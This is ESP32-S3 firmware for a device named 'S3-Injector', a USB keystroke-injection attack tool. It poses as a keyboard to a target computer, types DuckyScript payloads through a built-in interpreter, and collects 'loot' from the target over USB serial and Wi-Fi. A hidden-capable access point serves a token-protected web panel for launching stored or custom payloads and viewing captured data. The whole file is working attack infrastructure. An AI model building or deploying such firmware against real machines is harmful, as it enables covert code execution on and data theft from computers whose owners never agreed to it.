#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <ArduinoJson.h>
#include <USB.h>
#include <USBHIDKeyboard.h>
#include <USBCDC.h>
#include "soc/soc.h"
#include "soc/rtc_cntl_reg.h"
#include <esp_system.h>
#include <tusb.h>
#include <freertos/semphr.h>

#include "config.h"
#include "payloads.h"
#include "ducky.h"
#include "web_content.h"

// Dispositivo USB Composto
USBCDC TargetSerial(0);
USBHIDKeyboard Keyboard;

// Web Server
AsyncWebServer server(HTTP_PORT);

// Token de sessao
static char authToken[33];

static void generateAuthToken() {
    for (int i = 0; i < 32; i += 4) {
        uint32_t r = esp_random();
        snprintf(authToken + i, 5, "%04x", (uint16_t)(r & 0xFFFF));
    }
    authToken[32] = '\0';
    Serial.printf("[+] Auth token: %s\n", authToken);
}

static bool checkAuth(AsyncWebServerRequest* r) {
    String h = r->header("Authorization");
    if (h.startsWith("Bearer ") && h.substring(7) == authToken)
        return true;
    r->send(401, "application/json", "{\"error\":\"unauthorized\"}");
    return false;
}

// Mutex para dados compartilhados entre cores
static SemaphoreHandle_t dataMutex;

// Loot Store
static const int MAX_LOOT = 32;

struct LootEntry {
    uint32_t id;
    unsigned long uptime;
    String type;
    String data;
};

static LootEntry lootStore[MAX_LOOT];
static int lootCount = 0;
static uint32_t nextLootId = 1;

static void addLoot(const char* type, const String& data) {
    if (lootCount >= MAX_LOOT) {
        for (int i = 0; i < MAX_LOOT - 1; i++)
            lootStore[i] = lootStore[i + 1];
        lootCount = MAX_LOOT - 1;
    }
    LootEntry& e = lootStore[lootCount];
    e.id     = nextLootId++;
    e.uptime = millis() / 1000;
    e.type   = type;
    e.data   = data;
    lootCount++;
}

// Custom Payloads
static const int MAX_CUSTOM = 16;

struct CustomPayload {
    uint32_t id;
    String title;
    String script;
};

static CustomPayload customStore[MAX_CUSTOM];
static int customCount = 0;
static uint32_t nextCustomId = 1;

// Payload pendente (inter-core)
static char pendingId[64];
static volatile bool hasPending = false;

// Buffer serial (Core 1)
static char serialRxBuf[SERIAL_BUF_CAP];
static size_t serialRxLen = 0;
static unsigned long lastSerialRx = 0;

// Body da requisicao (Core 0)
static String apiBody;

// Estado
static bool lastCdcState = false;
static volatile bool payloadRunning = false;

// Inicializar Wi-Fi AP
void initAccessPoint() {
    WiFi.mode(WIFI_AP);
    IPAddress ip, gateway, subnet;
    ip.fromString(AP_LOCAL_IP);
    gateway.fromString(AP_GATEWAY);
    subnet.fromString(AP_SUBNET);
    WiFi.softAPConfig(ip, gateway, subnet);

    if (WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL, AP_HIDDEN ? 1 : 0, AP_MAX_CONN)) {
        Serial.printf("[+] AP up — SSID: %s  IP: %s\n", AP_SSID, WiFi.softAPIP().toString().c_str());
    } else {
        Serial.println("[!] AP failed");
    }
}

// Inicializar USB Composto
void initUSB() {
    USB.VID(C2_USB_VID);
    USB.PID(C2_USB_PID);
    USB.productName(C2_USB_PRODUCT);
    USB.manufacturerName(C2_USB_MFR);

    TargetSerial.enableReboot(false);
    TargetSerial.setRxBufferSize(4096);
    TargetSerial.begin(SERIAL_BAUD);
    TargetSerial.setTimeout(10);
    Keyboard.begin();
    USB.begin();
    Serial.println("[+] USB composite up (HID + CDC)");
}

// DuckyScript State Machine (non-blocking, Core 1)
enum DuckyState { DS_IDLE, DS_RUNNING, DS_TYPING };

struct {
    DuckyState state = DS_IDLE;
    String script;
    int pos = 0;
    String lastCmd;
    unsigned long waitUntil = 0;
    String typeStr;
    int typePos = 0;
    int repeatN = 0;
    String repeatLine;
} ducky;

void duckyProcessLine(const String& line);

void duckyStart(const String& script) {
    ducky.script = script;
    ducky.pos = 0;
    ducky.lastCmd = "";
    ducky.waitUntil = 0;
    ducky.typeStr = "";
    ducky.typePos = 0;
    ducky.repeatN = 0;
    ducky.repeatLine = "";
    ducky.state = DS_RUNNING;
    payloadRunning = true;
    Serial.printf("[*] DuckyScript: %d bytes\n", script.length());
}

void duckyTick() {
    if (ducky.state == DS_IDLE) return;
    if (millis() < ducky.waitUntil) return;

    if (!tud_mounted()) {
        ducky.waitUntil = millis() + 500;
        return;
    }
    if (tud_suspended()) {
        tud_remote_wakeup();
        ducky.waitUntil = millis() + 200;
        return;
    }

    if (ducky.state == DS_TYPING) {
        if (ducky.typePos >= (int)ducky.typeStr.length()) {
            ducky.state = DS_RUNNING;
            return;
        }
        char c = ducky.typeStr[ducky.typePos];
        if (!Ducky::typeCharABNT2(c)) {
            Keyboard.press(c);
            delay(8);
            Keyboard.release(c);
            delay(8);
        }
        ducky.typePos++;
        return;
    }

    if (ducky.repeatN > 0) {
        duckyProcessLine(ducky.repeatLine);
        ducky.repeatN--;
        return;
    }

    if (ducky.pos >= (int)ducky.script.length()) {
        ducky.state = DS_IDLE;
        ducky.script = "";
        payloadRunning = false;
        Serial.println("[+] DuckyScript: done");
        return;
    }

    int end = ducky.script.indexOf('\n', ducky.pos);
    if (end == -1) end = ducky.script.length();
    String line = ducky.script.substring(ducky.pos, end);
    ducky.pos = end + 1;
    line.trim();

    if (line.length() == 0 || line.startsWith("REM")) return;
    duckyProcessLine(line);
}

void duckyProcessLine(const String& line) {
    if (line.startsWith("DELAY ")) {
        ducky.waitUntil = millis() + line.substring(6).toInt();
        ducky.lastCmd = line;
        return;
    }
    if (line.startsWith("STRING ")) {
        ducky.typeStr = line.substring(7);
        ducky.typePos = 0;
        ducky.state = DS_TYPING;
        ducky.lastCmd = line;
        return;
    }
    if (line.startsWith("REPEAT ")) {
        int n = line.substring(7).toInt();
        if (ducky.lastCmd.length() > 0 && !ducky.lastCmd.startsWith("REPEAT")) {
            ducky.repeatLine = ducky.lastCmd;
            ducky.repeatN = n;
        }
        return;
    }
    if (line.startsWith("GUI ") || line.startsWith("WINDOWS ")) {
        String arg = line.substring(line.indexOf(' ') + 1);
        arg.trim();
        Ducky::modCombo(HID_KEY_GUI_LEFT, arg);
    } else if (line.startsWith("CTRL-ALT ")) {
        Ducky::modCombo2(HID_KEY_CONTROL_LEFT, HID_KEY_ALT_LEFT, line.substring(9));
    } else if (line.startsWith("CTRL-SHIFT ")) {
        Ducky::modCombo2(HID_KEY_CONTROL_LEFT, HID_KEY_SHIFT_LEFT, line.substring(11));
    } else if (line.startsWith("CTRL ")) {
        Ducky::modCombo(HID_KEY_CONTROL_LEFT, line.substring(5));
    } else if (line.startsWith("ALT ")) {
        Ducky::modCombo(HID_KEY_ALT_LEFT, line.substring(4));
    } else if (line.startsWith("SHIFT ")) {
        Ducky::modCombo(HID_KEY_SHIFT_LEFT, line.substring(6));
    } else {
        uint8_t k = Ducky::specialKey(line);
        if (k) Ducky::singleKey(k);
    }
    ducky.lastCmd = line;
}

// Disparar payload
void firePayload(const char* id) {
    if (payloadRunning) {
        Serial.println("[!] Payload already running");
        return;
    }
    Serial.printf("[*] Fire: %s\n", id);

    if (strncmp(id, "custom:", 7) == 0) {
        uint32_t cid = atoi(id + 7);
        String script;
        bool found = false;
        xSemaphoreTake(dataMutex, portMAX_DELAY);
        for (int i = 0; i < customCount; i++) {
            if (customStore[i].id == cid) {
                script = customStore[i].script;
                found = true;
                break;
            }
        }
        xSemaphoreGive(dataMutex);
        if (found) {
            duckyStart(script);
        } else {
            Serial.println("[!] Custom payload not found");
        }
        return;
    }

    for (int i = 0; i < PAYLOAD_COUNT; i++) {
        if (strcmp(id, PAYLOADS[i].id) == 0) {
            duckyStart(String(PAYLOADS[i].cmd));
            return;
        }
    }
    Serial.printf("[!] Unknown payload: %s\n", id);
}

// Enviar resposta gzip
void sendGz(AsyncWebServerRequest* req, const char* type, const uint8_t* data, size_t len) {
    AsyncWebServerResponse* res = req->beginResponse(200, type, data, len);
    res->addHeader("Content-Encoding", "gzip");
    req->send(res);
}

// Handler de body
void onBody(AsyncWebServerRequest*, uint8_t* data, size_t len, size_t index, size_t total) {
    if (total > 8192) return;
    if (index == 0) apiBody = "";
    apiBody += String((char*)data, len);
}

// Rotas da API
void setupRoutes() {
    server.on("/", HTTP_GET, [](AsyncWebServerRequest* r) {
        sendGz(r, "text/html", INDEX_HTML_GZ, INDEX_HTML_GZ_LEN);
    });
    server.on("/app.js", HTTP_GET, [](AsyncWebServerRequest* r) {
        sendGz(r, "application/javascript", APP_JS_GZ, APP_JS_GZ_LEN);
    });
    server.on("/app.css", HTTP_GET, [](AsyncWebServerRequest* r) {
        sendGz(r, "text/css", APP_CSS_GZ, APP_CSS_GZ_LEN);
    });

    // Login (sem autenticacao)
    server.on("/api/login", HTTP_POST,
        [](AsyncWebServerRequest* r) {
            JsonDocument doc;
            if (deserializeJson(doc, apiBody)) {
                r->send(400, "application/json", "{\"error\":\"bad request\"}");
                return;
            }
            const char* user = doc["user"] | "";
            const char* pass = doc["pass"] | "";
            if (strcmp(user, AUTH_USER) == 0 && strcmp(pass, AUTH_PASS) == 0) {
                String resp = "{\"token\":\"" + String(authToken) + "\"}";
                r->send(200, "application/json", resp);
                Serial.printf("[+] Login OK from %s\n", r->client()->remoteIP().toString().c_str());
            } else {
                r->send(403, "application/json", "{\"error\":\"invalid credentials\"}");
                Serial.printf("[!] Login FAIL from %s\n", r->client()->remoteIP().toString().c_str());
            }
        }, nullptr, onBody
    );

    server.on("/api/status", HTTP_GET, [](AsyncWebServerRequest* r) {
        if (!checkAuth(r)) return;
        JsonDocument doc;
        doc["status"]          = "online";
        doc["uptime_s"]        = millis() / 1000;
        doc["heap_free"]       = ESP.getFreeHeap();
        doc["heap_min"]        = ESP.getMinFreeHeap();
        doc["clients"]         = WiFi.softAPgetStationNum();
        doc["cdc_connected"]   = tud_mounted();
        doc["payload_running"] = (bool)payloadRunning;
        doc["reset_reason"]    = (int)esp_reset_reason();

        xSemaphoreTake(dataMutex, portMAX_DELAY);
        doc["loot_count"] = lootCount;
        xSemaphoreGive(dataMutex);

        String json;
        serializeJson(doc, json);
        r->send(200, "application/json", json);
    });

    server.on("/api/loot", HTTP_GET, [](AsyncWebServerRequest* r) {
        if (!checkAuth(r)) return;
        JsonDocument doc;
        JsonArray arr = doc["loot"].to<JsonArray>();

        xSemaphoreTake(dataMutex, portMAX_DELAY);
        for (int i = 0; i < lootCount; i++) {
            JsonObject obj = arr.add<JsonObject>();
            obj["id"]        = lootStore[i].id;
            obj["timestamp"] = String(lootStore[i].uptime) + "s";
            obj["type"]      = lootStore[i].type;
            obj["data"]      = lootStore[i].data;
        }
        xSemaphoreGive(dataMutex);

        String json;
        serializeJson(doc, json);
        r->send(200, "application/json", json);
    });

    server.on("/api/loot/clear", HTTP_POST, [](AsyncWebServerRequest* r) {
        if (!checkAuth(r)) return;
        xSemaphoreTake(dataMutex, portMAX_DELAY);
        for (int i = 0; i < lootCount; i++) {
            lootStore[i].type = "";
            lootStore[i].data = "";
        }
        lootCount = 0;
        nextLootId = 1;
        xSemaphoreGive(dataMutex);
        r->send(200, "application/json", "{\"cleared\":true}");
    });

    server.on("/api/loot/test", HTTP_POST, [](AsyncWebServerRequest* r) {
        if (!checkAuth(r)) return;
        xSemaphoreTake(dataMutex, portMAX_DELAY);
        addLoot("test", "Loot pipeline OK — CDC serial capture is operational");
        uint32_t id = nextLootId - 1;
        xSemaphoreGive(dataMutex);
        Serial.printf("[+] Test loot #%d added\n", id);
        r->send(200, "application/json", "{\"added\":true}");
    });

    server.on("/api/loot/receive", HTTP_POST,
        [](AsyncWebServerRequest* r) {
            if (!checkAuth(r)) return;
            if (apiBody.length() == 0) {
                r->send(400, "application/json", "{\"error\":\"empty\"}");
                return;
            }
            xSemaphoreTake(dataMutex, portMAX_DELAY);
            addLoot("wifi", apiBody);
            uint32_t id = nextLootId - 1;
            xSemaphoreGive(dataMutex);
            Serial.printf("[+] WiFi loot #%d: %d bytes\n", id, apiBody.length());
            r->send(200, "application/json", "{\"received\":true}");
        }, nullptr, onBody
    );

    server.on("/api/execute", HTTP_POST,
        [](AsyncWebServerRequest* r) {
            if (!checkAuth(r)) return;
            if (payloadRunning) {
                r->send(409, "application/json", "{\"error\":\"payload running\"}");
                return;
            }
            JsonDocument doc;
            if (deserializeJson(doc, apiBody) || !doc["payload"].is<const char*>()) {
                r->send(400, "application/json", "{\"error\":\"bad request\"}");
                return;
            }
            const char* pid = doc["payload"];
            if (strlen(pid) >= sizeof(pendingId)) {
                r->send(400, "application/json", "{\"error\":\"id too long\"}");
                return;
            }
            strlcpy(pendingId, pid, sizeof(pendingId));
            hasPending = true;
            r->send(200, "application/json", "{\"queued\":true}");
        }, nullptr, onBody
    );

    server.on("/api/payloads", HTTP_GET, [](AsyncWebServerRequest* r) {
        if (!checkAuth(r)) return;
        JsonDocument doc;
        JsonArray bi = doc["builtin"].to<JsonArray>();
        for (int i = 0; i < PAYLOAD_COUNT; i++) {
            JsonObject o = bi.add<JsonObject>();
            o["id"]          = PAYLOADS[i].id;
            o["label"]       = PAYLOADS[i].label;
            o["description"] = PAYLOADS[i].description;
            o["risk"]        = PAYLOADS[i].risk;
        }

        JsonArray cu = doc["custom"].to<JsonArray>();
        xSemaphoreTake(dataMutex, portMAX_DELAY);
        for (int i = 0; i < customCount; i++) {
            JsonObject o = cu.add<JsonObject>();
            o["id"]    = customStore[i].id;
            o["title"] = customStore[i].title;
        }
        xSemaphoreGive(dataMutex);

        String json;
        serializeJson(doc, json);
        r->send(200, "application/json", json);
    });

    server.on("/api/payloads/create", HTTP_POST,
        [](AsyncWebServerRequest* r) {
            if (!checkAuth(r)) return;
            JsonDocument doc;
            if (deserializeJson(doc, apiBody)) {
                r->send(400, "application/json", "{\"error\":\"bad json\"}");
                return;
            }
            xSemaphoreTake(dataMutex, portMAX_DELAY);
            if (customCount >= MAX_CUSTOM) {
                xSemaphoreGive(dataMutex);
                r->send(507, "application/json", "{\"error\":\"max custom payloads\"}");
                return;
            }
            CustomPayload& cp = customStore[customCount];
            cp.id     = nextCustomId++;
            cp.title  = doc["title"].as<String>();
            cp.script = doc["script"].as<String>();
            customCount++;
            uint32_t savedId = cp.id;
            xSemaphoreGive(dataMutex);
            Serial.printf("[+] Custom payload #%d saved\n", savedId);
            String resp = "{\"id\":" + String(savedId) + ",\"saved\":true}";
            r->send(200, "application/json", resp);
        }, nullptr, onBody
    );

    server.on("/api/payloads/delete", HTTP_POST,
        [](AsyncWebServerRequest* r) {
            if (!checkAuth(r)) return;
            if (!r->hasParam("id")) {
                r->send(400, "application/json", "{\"error\":\"missing id\"}");
                return;
            }
            uint32_t id = r->getParam("id")->value().toInt();
            bool found = false;
            xSemaphoreTake(dataMutex, portMAX_DELAY);
            for (int i = 0; i < customCount; i++) {
                if (customStore[i].id == id) {
                    for (int j = i; j < customCount - 1; j++)
                        customStore[j] = customStore[j + 1];
                    customStore[customCount - 1].title  = "";
                    customStore[customCount - 1].script = "";
                    customCount--;
                    found = true;
                    break;
                }
            }
            xSemaphoreGive(dataMutex);
            if (found) {
                r->send(200, "application/json", "{\"deleted\":true}");
            } else {
                r->send(404, "application/json", "{\"error\":\"not found\"}");
            }
        }
    );

    server.onNotFound([](AsyncWebServerRequest* r) {
        if (r->url().startsWith("/api/")) {
            r->send(404, "application/json", "{\"error\":\"not found\"}");
            return;
        }
        sendGz(r, "text/html", INDEX_HTML_GZ, INDEX_HTML_GZ_LEN);
    });
}

// Setup
void setup() {
    WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
    Serial.begin(115200);
    delay(2000);

    dataMutex = xSemaphoreCreateMutex();
    generateAuthToken();

    esp_reset_reason_t rst = esp_reset_reason();
    Serial.printf("\n[*] S3-Injector — Boot (reset: %d)\n", (int)rst);
    Serial.printf("[*] Free heap: %d bytes\n", ESP.getFreeHeap());

    initUSB();
    initAccessPoint();
    setupRoutes();

    server.begin();
    Serial.printf("[+] HTTP on port %d\n", HTTP_PORT);
    Serial.println("[*] Ready");

    if (rst != ESP_RST_POWERON && rst != ESP_RST_SW) {
        const char* reasons[] = {
            "UNKNOWN","POWERON","?","SW","PANIC",
            "INT_WDT","TASK_WDT","WDT","DEEPSLEEP","BROWNOUT","SDIO"
        };
        int ri = (int)rst;
        const char* label = (ri >= 0 && ri < 11) ? reasons[ri] : "UNKNOWN";
        xSemaphoreTake(dataMutex, portMAX_DELAY);
        addLoot("crash", String("ESP32 reset: ") + label);
        xSemaphoreGive(dataMutex);
        Serial.printf("[!] Abnormal reset: %s\n", label);
    }
}

// Loop
void loop() {
    duckyTick();

    bool cdcNow = (bool)TargetSerial;
    if (cdcNow != lastCdcState) {
        Serial.printf("[%s] CDC: target %s\n",
                      cdcNow ? "+" : "-",
                      cdcNow ? "CONNECTED (DTR up)" : "DISCONNECTED");
        lastCdcState = cdcNow;
    }

    if (hasPending) {
        hasPending = false;
        firePayload(pendingId);
    }

    while (TargetSerial.available() > 0) {
        size_t room = SERIAL_BUF_CAP - 1 - serialRxLen;
        if (room == 0) {
            while (TargetSerial.available()) TargetSerial.read();
            break;
        }
        uint8_t chunk[256];
        size_t avail = TargetSerial.available();
        size_t toRead = avail < sizeof(chunk) ? avail : sizeof(chunk);
        if (toRead > room) toRead = room;
        size_t n = TargetSerial.readBytes(chunk, toRead);
        if (n == 0) break;
        memcpy(serialRxBuf + serialRxLen, chunk, n);
        serialRxLen += n;
        lastSerialRx = millis();
    }

    if (serialRxLen > 0 && (millis() - lastSerialRx > LOOT_TIMEOUT)) {
        serialRxBuf[serialRxLen] = '\0';
        String captured(serialRxBuf);
        serialRxLen = 0;

        xSemaphoreTake(dataMutex, portMAX_DELAY);
        addLoot("serial", captured);
        xSemaphoreGive(dataMutex);
        Serial.printf("[+] Loot: %d bytes captured\n", captured.length());
    }

    static unsigned long lastApCheck = 0;
    if (millis() - lastApCheck > 30000) {
        lastApCheck = millis();
        if (WiFi.softAPIP() == IPAddress(0, 0, 0, 0)) {
            Serial.println("[!] AP lost — reinitializing");
            WiFi.softAPdisconnect(true);
            delay(200);
            initAccessPoint();
        }
    }

    delay(1);
}
